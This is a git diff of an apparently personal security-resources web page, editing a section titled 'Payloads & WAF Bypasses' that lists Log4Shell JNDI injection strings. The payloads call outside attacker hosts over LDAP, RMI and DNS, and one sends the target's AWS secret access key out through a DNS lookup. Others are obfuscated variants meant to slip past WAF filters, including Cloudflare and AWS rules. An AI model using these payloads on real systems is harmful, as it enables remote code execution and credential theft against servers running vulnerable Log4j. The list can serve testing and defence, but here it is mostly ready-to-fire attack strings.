@@ -212,11 +212,9 @@
 4. - [requestbin](https://requestbin.net/)
 5. - [burp collaborator](https://portswigger.net/burp/documentation/collaborator)
 6. - [run your own dns servers](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
-                    </p>< br />
-     
+                    </p><br>
 <h2>Payloads & WAF Bypasses</h2>
-<pre><code>
-Want to know the Java version running on the target?
+<pre><code>Want to know the Java version running on the target?<br>
 ${jndi:ldap://${sys:java.version}.collaborator.com}
 ${env:JAVA_VERSION}
 ${sys:java.version}
@@ -242,8 +240,9 @@ j${main:\k5:-Nd}i${spring:k5:-:}
 j${sys:k5:-nD}${lower:i${web:k5:-:}}
 j${::-nD}i${::-:}
 j${EnV:K5:-nD}i:
-j${loWer:Nd}i${uPper::}
+j${loWer:Nd}i${uPper::}<br>
 
+=======
 <b>Bypass WAF</b>
 
 1. ${jndi:ldap://127.0.0.1:1389/ badClassName}
@@ -254,12 +253,14 @@ j${loWer:Nd}i${uPper::}
 
 4. ${jndi:rmi://adsasd.asdasd.asdasd}
 
-5. ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}
+5. ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}<br>
+=========
 
 If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:
 
-${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}<br>
 
+=====
 <b>Log4j Cloudflare bypass :</b>
 ${jndi:dns://aeutbj.example.com/ext}
 ${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
@@ -267,9 +268,6 @@ https://pbs.twimg.com/media/FGVKwNYXIAMQ5nH?format=jpg&name=small <br>
 
 Just bypassed AWS WAF for log4j jndi injection: @11xuxx
 ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
-
-
-
 </code></pre>
                     <h2>Notion</h2>
                     <p>Notion is best for taking notes as it is easier to use. I am personally using this with my automated recon tools.</p>
